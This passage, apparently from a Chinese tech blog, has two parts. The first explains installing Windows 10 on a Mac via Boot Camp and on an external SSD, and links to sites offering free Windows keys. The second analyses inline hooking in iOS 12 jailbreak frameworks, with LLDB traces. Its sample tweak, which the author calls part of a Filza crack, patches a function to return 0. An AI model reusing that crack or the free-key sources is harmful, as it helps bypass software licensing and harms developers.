win10镜像准备好以后，用BootCamp装的时候选择该镜像并分配50G的分区。点击下一步，下载完相关驱动以后（连VPN，不然有点慢）进行分区，结果就提示分区失败了。去网上搜了一下，大多数人都说由于最新分区采用的APFS导致得，一堆解决方案。主要都说采用系统降级的方式，或者由于修复time machine造成的分区错误，或者磁盘加密的缘故。但是很明显我刚装的系统不存在这些问题。 又重新尝试了几次，还是不行，快怀疑苹果BootCamp的问题了。 还有人提示可以进入单用户模式（command+s）然后用fsck_apfs或者fsck命令去修复磁盘。 但是上面的都做了以后还是不行。 2、Bootcamp+启动盘+手动分区既然BootCamp自动安装不了，那选择手动安装吧。这个原理也不复杂，BootCamp最主要工作在于下载驱动+分区+引导win系统。然后这些我们实际上可以手动完成。 制作启动盘 这里可以找一个U盘来制作win10的启动盘，由于我这里是移动硬盘，所以我分了一个10G的区来作为启动盘。这里制作需要unetbootin来完成制作，这个软件支持mac、win、linux平台。我下载了mac版的。 分别选择win10的iso镜像，以及选择对应的设备。如果不清楚你的设备是哪一个，可以输入diskutil list去找到对应的设备名，点击ok等待一会，就这样启动盘就制作完成了。 手动分区 这里的分区是指将mac主硬盘分一个区来安装Windows，由于这里需要安装Windows，所以只能用Windows支持的磁盘格式，最开始我分了一个50G的FAT32分区，然后用启动盘安装发现不能选择该磁盘。后面经过一番研究，才发现。Windows磁盘需要NTFS格式的分区，但是这里有个问题在于mac不支持NTFS格式的操作。于是乎，搜索了一番，发现可以安装一些软件、驱动让mac支持NTFS格式。这里提供两种软件供参考ParagonNTFS和tuxera-ntfs但都是收费的。安装完以后终于能分NTFS格式的区了，但是有个头疼的问题在于只能分30G以下才会成功，大于30G就提示失败。但是如果分区是30G的话，启动盘选择磁盘的时候又会提示需要大于40G的磁盘，这里不是矛盾了吗。 重装mac系统由于上面手动分区也不行，我就重装了mac系统。由于我之前制作了mojave最新系统的mac启动盘，所以重装还是比较快。建议制作一个mac系统盘备用。这里简单说下制作过程。 同样给硬盘分一个10G的区 下载macOS系统，这里比如Install macOS Mojave sudo /Applications/Install\\ macOS\\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/MyVolume执行里面的createinstallmedia命令，选择上面的分区就制作完成了。 如果还有问题可以点这里 重装完以后，我试了下用BootCamp安装，发现一路畅通，直接到引导了Windows系统安装的步骤，但是这里又有问题了。 WTF？你自己刚分好的区，现在又给我说不行了？这里还真没办法。不过我回到macOS用磁盘工具发现，虽然不能安装Windows，但却给我分好了一个NTFS格式的区。既然有了这个区，那我直接用上面制作的启动盘手动安装Windows不就完了。 重启电脑，按住option按钮，选择那个win启动盘，到选择Windows安装磁盘的步骤，发现BootCamp分的那个区是可以用的，于是我就格式化了那个磁盘，然后选择它，果然安装成功了。这一刻我饱含泪水，终于把Windows安装成功了。经过一番设置，顺利进入win10系统，顺便说下感觉win10还不错，无论是画质还是系统设计，已经比win7好太多。 当我以为一切就这样结束的时候，发现Windows不能连wifi，不过突然想起，由于我是手动安装的Windows，所以并没有安装相关驱动，导致wifi模块并不能识别。还好BootCamp提供了手动下载驱动支持文件的选项，这里由于需要在win10中访问并运行驱动安装程序，所以我又分了一个FAT32的区专门提供win10访问。把下载的驱动程序放入这个分区，重启进入win10系统，运行里面的安装程序以后，wifi就能连接上了。 最后我为了体验完整的win10系统，还在淘宝上买了一个激活码，成功激活为正版win10。不过我这里也提供几个免费的key，但不一定可靠，嫌麻烦可以花几块钱去淘宝买。 https://productkeysdl.com/windows-10-product-key/ http://www.ylmfwin100.com/ylmf/8642.html 双系统win10使用体验win10装好以后，体验了下IDA，加载dyld_cache后发现是真的比mac和虚拟机装的IDA流畅很多。也不费我这么多精力去装双系统。不过由于我的mac磁盘一共才256G，所以我下一步的打算是买一个移动SSD硬盘来装Windows，整个系统都运行在外置的SSD硬盘，看了下现在移动固态硬盘的速度，应该是没什么问题的。暂选三星T5、500G、540M/s那款。 外置SSD硬盘安装win10前面说到了双系统上的win10体验，就速度、性能来说已经很不错了。但是为什么还要用外置SSD来安装win10呢。这里涉及到我的mac只有256G硬盘，还要划分一部分来安装win10，这样两个系统可用空间都很小。我买的三星T5移动固态硬盘到手了，准备把win10直接安装到上面。由于现在移动固态硬盘的速度完全能够支持这样的方式。 最开始我的尝试在这之前，我先按照自己的想法去实现外置SSD安装win10。刚开始想，我之前制作了启动盘，那么我直接从启动盘启动以后把win10选择外置SSD不就行了吗。直到我进行到那一步的时候才发现，win10为了各方面原因是阻止你将系统安装到外置磁盘上面的。 正确安装步骤这里有个视频演示了整个过程，不熟悉的可以先看下这个视频。 https://9to5mac.com/2017/08/31/how-windows-10-mac-boot-camp-external-drive-video/ https://www.youtube.com/watch?v=kR28kVtZYJY&amp;feature=youtu.be 前提准备： win10镜像 vmware虚拟机或移动硬盘 WinToUSB WindowsSupport驱动（通过BootCamp下载） 有线鼠标和键盘（设置win10的时候由于没有驱动，键盘和触控板不能识别） 下面说下大概需要哪些步骤去完成： 用虚拟机或者其他win电脑用WinToUSB去制作WINTOGO启动盘，这里WinToUSB使用简单就不再介绍，选择对应的win10镜像文件和外置SSD磁盘等待制作完成就行。 这里将下载的WindowsSupport复制进上面的WINTOGO启动盘之中或者等安装完以后用其他硬盘拷贝到win10中然后安装驱动也行。 到这一步直接重启按住option选择WINTOGO启动盘安装win10系统就行，整个过程就是需要连接有线鼠标和键盘。 当进入win10系统以后，由于没有驱动，导致蓝牙、wifi等等都不能工作。这时候选择WindowsSupport里面的驱动安装重启以后一切都正常了。 外置SSD安装win10使用感受首先使用上面来说和内置的磁盘差别不大，依然很流畅。但有以下优势，随身携带了一个系统，只要有一台电脑立马能进入你的工作环境；与内置系统有很好的独立性，且不用担心内置系统和外置系统磁盘空间大小。 如果说缺点的话就是外置SSD与电脑是用有线连接，存在误触导致系统可能发生panic。不过就三星T5来看，连接的数据线还是比较牢固的。整个三种方式安装来了，我选择了最后这种。满足了性能，独立，空间等方方面面的优势。建议有这方面需求的都采用外置SSD来安装运行win10。 外置SSD硬盘安装macOS和win10双系统前面提到，我在买来的三星T5上面装了win10系统，但是整个500G用来只装win10始终觉得有点浪费。于是想着能不能在外置SSD上装双系统。刚开始以为很简单，结果这里坑很多也很大。如果你对磁盘分区，引导系统等不是很熟悉的话，建议一定要谨慎操作并做好数据备份。 准备条件 win10镜像 一台win电脑（最好不要用虚拟机，虚拟机操作很卡很慢） 一台mac电脑 两个外置硬盘，一个SSD用作装装系统，一个用作制作引导盘和数据传输（建议使用一般机械硬盘即可，容量大一点）。 一个macOS系统引导盘 WinToUSB 用作制作win10系统外置SSD引导盘。 diskgenius 这个工具十分重要，没有这个磁盘工具无法完成。用作各种细腻化磁盘分区管理 有线鼠标和键盘（设置win10的时候由于没有驱动，键盘和触控板不能识别） WindowsSupport驱动（通过BootCamp下载） 最初想法和尝试 先装win10，失败 最开始的我想法就是先直接在移动SSD上面装一个win10，然后再进行分区（exFAT、APFS或者其他mac上能识别挂载的文件系统都行）。接着再回到macOS中，用磁盘工具抹掉并设置为APFS格式的分区。这样在用系统引导盘去安装的时候选择该分区不就行了。 失败原因：在这样操作的时候，回到macOS对这个分区进行格式化的时候会出现错误，而且那个win10系统也不能引导了，原因在于会将win10系统前面的引导分区覆盖。 先装macOS，失败 上面的方案失败以后我就尝试先装macOS，装macOS就十分简单，直接将整个磁盘格式化为APFS格式，然后分一个exFAT或者NTFS的区留着装win10。装macOS就直接用引导盘然后选择APFS那个分区安装就可以了。接下来就回到win系统中，用WinToUSB工具安装win10，然而这个工具并不能按照磁盘分区来进行安装，最小单位是磁盘设备，也就是说，这样会将整个磁盘都格式化安装为win10，这样做的话前面安装的macOS系统就会被删除。 失败原因：WinToUSB按磁盘设备而不是磁盘分区来安装的win10。 最终解决方案根据前面的失败情况，理性分析了一下，在没有更好的工具替换WinToUSB的情况下，要想实现在移动SSD安装双系统，只能先装win10。但是前面先装win10却失败了，下面经过大量的尝试，找出了一个很大的坑，也找出了失败的原因。 装完win10以后，如果你分一个APFS区到mac上面抹掉的时候，出现不能win10不能引导以及磁盘不能挂载的原因是，macOS挂载APFS分区的时候是需要一个200M的EFI分区进行引导。这个是mac系统独有的，在win上面挂载分区是不需要这玩意的。所以出现前面问题的原因是，由于需要200M的EFI引导分区，所以抹掉的时候会将win10的引导分区给覆盖掉，从而导致不能启动win10。而为什么自身的APFS也不能挂载，是因为前面的win10引导分区只有100M，小于200M，所以APFS分区也不能挂载。 弄清楚原因以后，那么现在就好办了。按照以下步骤 先用WinToUSB安装win10 然后用diskgenius备份win10的引导分区，等装完macOS以后再写回去。 用diskgenius创建一个APFS或者其他mac上能识别的分区。（大小就为磁盘的一半，后面会在上面装macOS） 然后用diskgenius调整win10前面的EFI引导分区大小，这里只要大于200M都行。此步需要十分谨慎，建议不熟悉的先搜索相关资料，对整个有一个清晰的了解以后再动手。 接下来回到mac系统中，用磁盘工具抹掉APFS分区，这样这个分区就能挂载了 随后用引导盘安装macOS系统到这个分区上面，此时的win10还是不能启动的。 macOS系统装完以后，在回到win系统，将前面备份的win10引导分区数据用diskgenius复制到前面的EFI分区之中。 重启电脑，验证两个系统是否都能正常启动即可。 这里说了安装过程中遇到的问题以及解决方法，但没有用截图或者更加详细的步骤。主要还是提供了在外置SSD上安装双系统的思路，如果后面有时间的话，会将整个过程以截图的方式详细的介绍出来。我个人建议就是对磁盘分区和系统引导不是很熟悉的新手来说，建议先不要尝试这种方案，等你熟悉或者我写了更详细的步骤以后再进行尝试。 win10下IDA启动失败的解决方案 无法启动IDA，缺少相关DLL 在安装完win10以后，打开IDA会提示相关的DLL无法找到。这里提供了dll缺失文件下载地址以及Windows 10上msvcp140.dll缺少问题的解决办法。 https://cn.dll-files.com/ http://www.win10jihuoma.com/archives/8183 启动后某些DLL加载失败 在启动IDA的时候我还遇到一个错误是无法加载ida目录下plugins下的DLL，提示跟多._开头的DLL文件加载失败，这些文件是mac系统记录的元数据文件，大小都在4k左右，肯定不能加载。删除了loader proc 和plugins下面的这些文件就正常了。关于这些文件的解释看这里。其他IDA启动问题可以看下面官方的文档 https://www.hexblog.com/?p=1132 参考 https://apple.stackexchange.com/questions/304623/bootcamp-problem-unable-to-partition-the-disk https://www.microsoft.com/zh-cn/software-download/windows10ISO https://www.hongkiat.com/blog/bootcamp-assistant-cannot-partition/ http://www.win10jihuoma.com/archives/category/win10zhuanyeban https://discussions.apple.com/thread/6832480 https://medium.com/@svenkirsime/install-windows-on-the-external-ssd-hdd-for-your-mac-5d29eefe5d1 https://www.cnblogs.com/lonecloud/p/7107063.html","tags":[{"name":"wiki","slug":"wiki","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"},{"name":"windows","slug":"windows","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/windows/"}]},{"title":"iOS12内存patch remap bug分析","date":"2019-08-15T16:22:28.000Z","path":"2019/08/16/iOS12-remap-bug-analyze/iOS12-remap-bug-analyze/","text":"iOS12内存patch remap bug分析 之前在做LLDB中的内存patch的时候提到在iOS12(包括iOS11)上面remap会出现bug的问题，一直相当困扰。其他hook框架都能在最新越狱上面正常patch，为什么我写的就不行？所以这篇文章准备一探究竟，但是目前我也还么搞清楚原因。（2019/09/04终于搞清楚了原因）不过这里会先分析最新系统上面两种hook框架对于inlinehook的原理及其相关细节。先看下他们的hook框架是如何实现内存patch和hook的。 iOS12 MSHookFunction分析(CoolStar越狱工具) 环境：iPhoneXS A12 iOS12 jailbreak by Chimera 在iOS12越狱上面CydiaSubstrate指向的是libsubstrate.dylib /Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate -&gt; ../../../usr/lib/libsubstrate.dylib 我们常用的MSHookFunction函数的实现就是在libsubstrate.dylib这里面，不过在这里仅仅是SubHookFunction的封装。而SubHookFunction的实现却是在/usr/lib/libsubstitute.0.dylib这里 /usr/lib/libsubstitute.0.dylib是一个软连接指向libsubstitute.dylib。这里的libsubstitute.dylib就是coolstar维护的版本。下面分析libsubstitute.dylib的inlinehook实现细节。 下面是我写的一个tweak插件代码（没错就是破解Filza的，不过只是部分代码），hook了_ZTL7624417887函数。 static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){ NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0); return 0; } %ctor{ MSImageRef image = MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;); NSLog(@&quot;===xxx===image:%p&quot;, image); void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;); NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887); MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887); } 调试分析 对MSHookFunction下断点，发现断在了我们预想的位置。 CydiaSubstrate`MSHookFunction: -&gt; 0x10550fca0 &lt;+0&gt;: cbz x0, 0x10550fca8 ; &lt;+8&gt; 0x10550fca4 &lt;+4&gt;: b 0x10550fe80 ; symbol stub for: SubHookFunction 0x10550fca8 &lt;+8&gt;: ret (lldb) re re General Purpose Registers: x0 = 0x000000010489a068 Filza`ZTL7624417887 x1 = 0x00000001055bbbec xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19 x2 = 0x00000001055bc148 xkfilza.dylib`original_ZTL7624417887 * frame #0: 0x000000010550fca0 CydiaSubstrate`MSHookFunction frame #1: 0x00000001055bbcd0 xkfilza.dylib`_logosLocalCtor_9eb4d9ed(argc=1, argv=0x000000016b657b50, envp=0x000000016b657b60) at Tweak.xm:29 frame #2: 0x00000001055df56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 424 frame #3: 0x00000001055df7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 40 X0就是hook的函数地址，X1为替换的函数地址，X2为保存的原函数地址。 先看一下这三个地址的数据，如下所见，此时ZTL7624417887还没有hook，所以前几个指令没有变化。 // ZTL7624417887 函数指令 (lldb) x/5i 0x000000010489a068 0x10489a068: 0xd2800008 mov x8, #0x0 0x10489a06c: 0xf0003489 adrp x9, 1683 0x10489a070: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x10489a074: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x10489a078: 0x6b00015f cmp w10, w0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x00000001055bbbec 0x1055bbbec: 0xd503237f pacibsp 0x1055bbbf0: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x1055bbbf4: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x1055bbbf8: 0x910083fd add x29, sp, #0x20 ; =0x20 0x1055bbbfc: 0xb81fc3a0 stur w0, [x29, #-0x4] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x00000001055bc148 0x1055bc148: 0x0000000000000000 0x0000000000000000 0x1055bc158: 0x0000000000000000 0x0000000000000000 0x1055bc168: 0x0000000000000000 这里是我们单步执行两次，使其执行hook函数。这次再观察一下这三个地址的数据 // ZTL7624417887 函数指令 (lldb) x/5i 0x000000010489a068 0x10489a068: 0xb0006911 adrp x17, 3361 0x10489a06c: 0x912fb231 add x17, x17, #0xbec ; =0xbec 0x10489a070: 0xd61f0220 br x17 0x10489a074: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x10489a078: 0x6b00015f cmp w10, w0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x00000001055bbbec 0x1055bbbec: 0xd503237f pacibsp 0x1055bbbf0: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x1055bbbf4: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x1055bbbf8: 0x910083fd add x29, sp, #0x20 ; =0x20 0x1055bbbfc: 0xb81fc3a0 stur w0, [x29, #-0x4] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x00000001055bc148 0x1055bc148: 0x0000000106e38000 0x0000000000000000 0x1055bc158: 0x0000000000000000 0x0000000000000000 0x1055bc168: 0x0000000000000000 这里发现原函数前三个字节和original_ZTL7624417887这个函数指令数据都发生了变化。 0x10489a068: 0xb0006911 adrp x17, 3361 0x10489a06c: 0x912fb231 add x17, x17, #0xbec ; =0xbec 0x10489a070: 0xd61f0220 br x17 这三条指令就是将原始执行流跳转到其他地址（这里也可以发现hook的函数至少大于3条指令，不然会覆盖其他函数）。这里简单计算就可以算出X17目标地址 (lldb) p/x (0x10489a068 &amp; ~(0x1000-0x1))+ (3361&lt;&lt;12) + 0xbec (long) $3 = 0x00000001055bbbec 所以会跳转到0x00000001055bbbec这个地址，等等！这个地址不就是new_ZTL7624417887我们hook代码的函数地址吗？所以函数hook就是通过修改前三条指令跳转到我们定义的函数来实现hook的。 这里还有个问题在于，如果我们在hook代码里面需要执行原函数，那么original_ZTL7624417887处保存的又是什么函数指针？所以这里跟一下0x0000000106e38000这个地址。 (lldb) x/12i 0x0000000106e38000 0x106e38000: 0xd2800008 mov x8, #0x0 0x106e38004: 0xd29a0009 mov x9, #0xd000 0x106e38008: 0xf2a09e49 movk x9, #0x4f2, lsl #16 0x106e3800c: 0xf2c00029 movk x9, #0x1, lsl #32 0x106e38010: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x106e38014: 0xd0fed311 adrp x17, -9630 0x106e38018: 0x9101d231 add x17, x17, #0x74 ; =0x74 0x106e3801c: 0xd61f0220 br x17 这里可以看出也是一个跳转，可以计算出X17跳转后的地址 (lldb) p/x (0x106e38014 &amp; ~(0x1000-0x1)) - (9630&lt;&lt;12) + 0x74 (long) $4 = 0x000000010489a074 再等等！这个地址不就是ZTL7624417887函数的第四条指令的地址吗，跳转到这里正好调用了原函数，但是有个问题在于，原函数的前三条指令去哪了？仔细观察上面的指令和原函数的前三条指令 //原函数前三条指令 0x10489a068: 0xd2800008 mov x8, #0x0 0x10489a06c: 0xf0003489 adrp x9, 1683 0x10489a070: 0x911a4129 add x9, x9, #0x690 ; =0x690 // original_ZTL7624417887函数指针的指令 0x106e38000: 0xd2800008 mov x8, #0x0 0x106e38004: 0xd29a0009 mov x9, #0xd000 0x106e38008: 0xf2a09e49 movk x9, #0x4f2, lsl #16 0x106e3800c: 0xf2c00029 movk x9, #0x1, lsl #32 0x106e38010: 0x911a4129 add x9, x9, #0x690 ; =0x690 稍加思索就知道，虽然指令不一样，但是结果却是一样的。为什么不直接写入原三条指令呢？这里涉及到adrp这个指令的相对寻址问题。由于adrp会根据当前pc值来计算，这样直接复制的话pc值已经变化，所以这里不得不重新计算X9的值。到这里，MSHookFunction的hook过程我们已经完全清楚了。 iOS12 MSHookFunction分析(unc0ver越狱工具) 环境：iPhone6+ iOS12 jailbreak by unc0ver 由于saurik不给CoolStar的越狱工具提供substrate和cydia的支持，导致现在越狱工具出现了两种hook框架。以Coolstar团队基于开源代码substitute和pwn20wnd团队的substrate两种hook框架。上面分析了substitute的hook原理。下面分析substrate的hook相关细节。这里多说两句，关于整个事件，可以访问CoolStar的博客https://coolstarorg.tumblr.com/他介绍了整个事件以及自己开发移植substitute的完整过程。我个人来说，还是十分崇拜CoolStar那份创新和坚持。自己动手完成了最新越狱的substitute移植，tweak注入，以及Sileo的开发。在这中间的过程，正如他在博客里面提到的那样，十分曲折，令人佩服。 在unc0ver中有如下dylib和hook相关 /usr/lib/substrate/SubstrateInserter.dylib /usr/lib/libsubstrate.dylib /Library/MobileSubstrate/MobileSubstrate.dylib /Library/Caches/cy-8lteBy.dylib 作为对比，这里同样以上面的tweak代码为例，hook了_ZTL7624417887函数。 static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){ NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0); return 0; } %ctor{ MSImageRef image = MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;); NSLog(@&quot;===xxx===image:%p&quot;, image); void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;); NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887); MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887); } 调试分析 对MSHookFunction下断点，发现断在了如下位置 // 调用栈 *libsubstrate.dylib`MSHookFunction SubstrateInserter.dylib`___lldb_unnamed_symbol6$$SubstrateInserter.dylib + 76 cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36 //下面可以看出来是hook了posix_spawn这个函数 x0 = 0x00000001be287310 libsystem_kernel.dylib`posix_spawn x1 = 0x000000010194a4c0 SubstrateInserter.dylib`___lldb_unnamed_symbol2 x2 = 0x0000000101950258 这里可以暂时不用管，同样下面的hook函数都忽略先。 //================================ execve ======================================== //调用栈 *libsubstrate.dylib`MSHookFunction SubstrateInserter.dylib`___lldb_unnamed_symbol6$$SubstrateInserter.dylib + 100 cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36 //下面可以看出来是hook了execve这个函数 x0 = 0x00000001be290034 libsystem_kernel.dylib`execve x1 = 0x000000010194a4fc SubstrateInserter.dylib`___lldb_unnamed_symbol3 x2 = 0x0000000101950260 //================================ __vfork ======================================== //调用栈 *libsubstrate.dylib`MSHookFunction cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36 //下面可以看出来是hook了__vfork这个函数 x0 = 0x00000001be28fa80 libsystem_kernel.dylib`__vfork x1 = 0x000000010194a5d4 SubstrateInserter.dylib`___lldb_unnamed_symbol4 x2 = 0x0000000101950268 通过上面可以看出，substrate会hook一些多进程启动相关的函数。这里我们都暂时不用分析，进行执行就到了我们自己写的hook点。 x0 = 0x0000000100f52068 Filza`ZTL7624417887 x1 = 0x0000000104a3fba4 xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19 x2 = 0x0000000104a40148 xkfilza.dylib`original_ZTL7624417887 libsubstrate.dylib`MSHookFunction: -&gt; 0x101d244dc &lt;+0&gt;: stp x29, x30, [sp, #-0x10]! 0x101d244e0 &lt;+4&gt;: mov x29, sp 0x101d244e4 &lt;+8&gt;: stp x20, x19, [sp, #-0x10]! 0x101d244e8 &lt;+12&gt;: stp x22, x21, [sp, #-0x10]! 0x101d244ec &lt;+16&gt;: sub sp, sp, #0x20 ; =0x20 0x101d244f0 &lt;+20&gt;: mov x21, x2 0x101d244f4 &lt;+24&gt;: mov x19, x1 0x101d244f8 &lt;+28&gt;: mov x20, x0 0x101d244fc &lt;+32&gt;: cbz x20, 0x101d24514 ; &lt;+56&gt; 0x101d24500 &lt;+36&gt;: mov x1, #0x0 0x101d24504 &lt;+40&gt;: mov x0, x19 0x101d24508 &lt;+44&gt;: bl 0x101d29150 ; symbol223$$libsubstrate.dylib 0x101d2450c &lt;+48&gt;: cmp x0, #0x0 ; =0x0 0x101d24510 &lt;+52&gt;: csel x19, x0, x19, ne 0x101d24514 &lt;+56&gt;: adrp x8, 265 0x101d24518 &lt;+60&gt;: add x8, x8, #0x498 ; =0x498 0x101d2451c &lt;+64&gt;: ldrb w8, [x8] 0x101d24520 &lt;+68&gt;: cbz w8, 0x101d24538 ; &lt;+92&gt; 0x101d24524 &lt;+72&gt;: str x19, [sp] 0x101d24528 &lt;+76&gt;: adr x1, #0xc8d10 ; &quot; &lt;= %p&quot; 0x101d2452c &lt;+80&gt;: nop 0x101d24530 &lt;+84&gt;: orr w0, wzr, #0x2 0x101d24534 &lt;+88&gt;: bl 0x101d10ad4 ; symbol80$$libsubstrate.dylib 0x101d24538 &lt;+92&gt;: adrp x8, 240 0x101d2453c &lt;+96&gt;: add x8, x8, #0xa80 ; =0xa80 0x101d24540 &lt;+100&gt;: add x8, x8, #0x10 ; =0x10 0x101d24544 &lt;+104&gt;: stp x21, x8, [sp, #0x8] 0x101d24548 &lt;+108&gt;: cmp x21, #0x0 ; =0x0 0x101d2454c &lt;+112&gt;: add x8, sp, #0x8 ; =0x8 0x101d24550 &lt;+116&gt;: csel x8, xzr, x8, eq 0x101d24554 &lt;+120&gt;: str x8, [sp, #0x18] 0x101d24558 &lt;+124&gt;: mov x0, #0x0 0x101d2455c &lt;+128&gt;: add x4, sp, #0x10 ; =0x10 0x101d24560 &lt;+132&gt;: mov x1, x20 0x101d24564 &lt;+136&gt;: mov x2, x20 0x101d24568 &lt;+140&gt;: mov x3, x19 0x101d2456c &lt;+144&gt;: bl 0x101d23f3c ;&lt;----------------hook实现函数 0x101d24570 &lt;+148&gt;: sub sp, x29, #0x20 ; =0x20 0x101d24574 &lt;+152&gt;: ldp x22, x21, [sp], #0x10 0x101d24578 &lt;+156&gt;: ldp x20, x19, [sp], #0x10 0x101d2457c &lt;+160&gt;: ldp x29, x30, [sp], #0x10 0x101d24580 &lt;+164&gt;: ret 从这里就可以看出和substitute的差别还是挺大的。先看下hook前三个地址的数据情况 // ZTL7624417887 函数指令 (lldb) x/5i 0x0000000100f52068 0x100f52068: 0xd2800008 mov x8, #0x0 0x100f5206c: 0xf0003489 adrp x9, 1683 0x100f52070: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x100f52074: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x100f52078: 0x6b00015f cmp w10, w0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x0000000104a3fba4 0x104a3fba4: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x104a3fba8: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x104a3fbac: 0x910083fd add x29, sp, #0x20 ; =0x20 0x104a3fbb0: 0xb81fc3a0 stur w0, [x29, #-0x4] 0x104a3fbb4: 0xb81f83a1 stur w1, [x29, #-0x8] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x0000000104a40148 0x104a40148: 0x0000000000000000 0x0000000000000000 0x104a40158: 0x0000000000000000 0x0000000000000000 0x104a40168: 0x0000000000000000 下面我们执行完这个函数，再观察hook以后三个地址的数据情况 // ZTL7624417887 函数指令 (lldb) x/10i 0x0000000100f52068 0x100f52068: 0x58000050 ldr x16, #0x8 ; &lt;+8&gt; 0x100f5206c: 0xd61f0200 br x16 0x100f52070: 0x7ff00040 .long 0x7ff00040 ; unknown opcode 0x100f52074: 0x00000001 .long 0x00000001 ; unknown opcode 0x100f52078: 0x6b00015f cmp w10, w0 0x100f5207c: 0x540000c0 b.eq 0x100f52094 ; &lt;+44&gt; 0x100f52080: 0x91000508 add x8, x8, #0x1 ; =0x1 0x100f52084: 0xf100311f cmp x8, #0xc ; =0xc 0x100f52088: 0x54ffff69 b.ls 0x100f52074 ; &lt;+12&gt; 0x100f5208c: 0x52800008 mov w8, #0x0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x0000000104a3fba4 0x104a3fba4: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x104a3fba8: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x104a3fbac: 0x910083fd add x29, sp, #0x20 ; =0x20 0x104a3fbb0: 0xb81fc3a0 stur w0, [x29, #-0x4] 0x104a3fbb4: 0xb81f83a1 stur w1, [x29, #-0x8] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x0000000104a40148 0x104a40148: 0x0000000104a53fe8 0x0000000000000000 0x104a40158: 0x0000000000000000 0x0000000000000000 0x104a40168: 0x0000000000000000 这里可以发现，和substitute一样，原函数ZTL7624417887和original_ZTL7624417887函数都发生了变化，但是ZTL7624417887的改动却不一样。substrate这里首先占用了四条指令大小（这里也可以知道用substate进行hook的时候函数至少满足4个字节），其中后两条指令其实是存得一个地址占用8个字节。 (lldb) x/g 0x100f52070 0x100f52070: 0x000000017ff00040 按地址大小解析出来，目标跳转的地址为0x000000017ff00040现在去看下这个地址里面是什么 (lldb) x/12i 0x000000017ff00040 0x17ff00040: 0x10020010 adr x16, #0x4000 0x17ff00044: 0xa9404610 ldp x16, x17, [x16] 0x17ff00048: 0xd61f0220 br x17 0x17ff0004c: 0xd503201f nop 0x17ff00050: 0x10020010 adr x16, #0x4000 0x17ff00054: 0xa9404610 ldp x16, x17, [x16] 0x17ff00058: 0xd61f0220 br x17 0x17ff0005c: 0xd503201f nop 0x17ff00060: 0x10020010 adr x16, #0x4000 0x17ff00064: 0xa9404610 ldp x16, x17, [x16] 0x17ff00068: 0xd61f0220 br x17 0x17ff0006c: 0xd503201f nop 这里可以发现又会进行一些跳转 (lldb) p/x 0x17ff00040+0x4000 (long) $2 = 0x000000017ff04040 (lldb) x/5g 0x000000017ff04040 0x17ff04040: 0x0000000000000000 0x0000000104a3fba4 这里计算出来X16=0 X17=0x0000000104a3fba4所以这里会跳转到0x0000000104a3fba4这个地址。等下！这个地址不就是new_ZTL7624417887的地址吗，这样进过两次跳转就跳到了我们写的hook函数了，完成了对原函数的hook。下面再分析如何又执行原函数，分析original_ZTL7624417887函数数据 (lldb) x/12i 0x0000000104a53fe8 0x104a53fe8: 0xd2800008 mov x8, #0x0 0x104a53fec: 0x580000e9 ldr x9, #0x1c 0x104a53ff0: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x104a53ff4: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x104a53ff8: 0x58000050 ldr x16, #0x8 0x104a53ffc: 0xd61f0200 br x16 0x104a54000: 0x00f52078 .long 0x00f52078 ; unknown opcode 0x104a54004: 0x00000001 .long 0x00000001 ; unknown opcode 